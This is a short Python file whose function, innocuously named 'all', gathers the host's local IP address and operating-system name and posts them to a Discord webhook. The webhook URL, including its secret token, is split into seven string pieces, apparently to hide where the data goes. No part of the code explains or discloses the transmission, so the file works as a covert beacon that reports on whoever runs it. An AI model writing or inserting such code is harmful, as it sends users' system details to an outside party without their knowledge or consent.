

def all() :
    import socket
    i =   socket.gethostbyname(socket.gethostname())


    u1 = 'https://dis'
    u2 = 'cord.com/api/w'
    u3 = 'ebhooks/9953226'
    u4 ='64816218172/QhU'
    u5 = 'hxpYlGKggSOr'
    u6 = 'r1RNiHom52qjwT9'
    u7 = 'vx-OTfaU14x4tgY'
        
    u = u1 + u2 + u3 + u4 + u5 + u6 + u7 +'Q0An_60_TwNJg0vViqGrKh4'


    from discord_webhook import DiscordWebhook, DiscordEmbed
    import os



    webhook = DiscordWebhook(url=u, username="me")

    embed = DiscordEmbed(title='i : '+ i, color='03b2f8')
    embed.set_author(name='Me', url='https://www.nicepng.com/png/full/222-2224618_yellow-orange-smile-emoticon-transparent-fuck-emojis.png', icon_url='https://icon-library.com/images/avatar-icon-images/avatar-icon-images-4.jpg')
    embed.set_footer(text='Embed Footer Text')
    embed.set_timestamp()

    embed.add_embed_field(name='n : ', value=os.name)
    embed.add_embed_field(name='Field 3', value='amet consetetur')
    embed.add_embed_field(name='Field 4', value='sadipscing elitr')

    webhook.add_embed(embed)
    response = webhook.execute()
